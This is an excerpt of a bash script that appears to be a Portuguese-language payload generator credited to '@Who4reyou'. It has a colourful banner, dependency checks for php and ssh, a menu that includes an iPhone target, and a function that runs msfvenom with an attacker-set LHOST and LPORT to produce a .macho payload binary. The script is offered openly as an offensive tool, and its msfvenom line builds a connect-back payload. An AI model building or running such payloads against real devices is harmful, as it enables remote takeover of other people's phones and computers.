...
printf "\e[0m\e[1;77m~~Tool Powered By @Who4reyou \e[0m\n"
printf "\e[0m\e[1;77m~~Gerador Versão Beta \e[0m\n\n"

printf "       \e[1;93m.:. \e[0m\e[1;77mGerador de Payload EXTERNO E INTERNO \e[0m\e[1;93m.:.\e[0m\n"                                                    
printf "                     \e[1;77mBy @Who4reyou\e[0m\n"
printf "\n"
}
...
command -v php > /dev/null 2>&1 || { echo >&2 "I Require Php But It's Not Installed. Install it. Aborting.(sudo apt-get install php)"; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I Require Ssh But It's Not Installed. Install it. Aborting.(sudo apt-get install ssh)"; 
exit 1; }
...
binaries_iphone() {
#format=".macho"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3  > $payload_name.macho
...
printf "\e[1;93m[\e[0m\e[1;77m5\e[0m\e[1;93m] Iphone\e[0m\n"
printf "\n"
...
menu
printf "\e[1;92m[*] ~~~~~~~~ ~~~~~~~~ \e[0m\n\n"
     printf "\e[1;92m[*] Thanks For Use The Tool!\e[0m\n"
printf "\e[1;92m[*] Feedback --> @who4reyou (Telegram Group)\e[0m\e[1;77m"
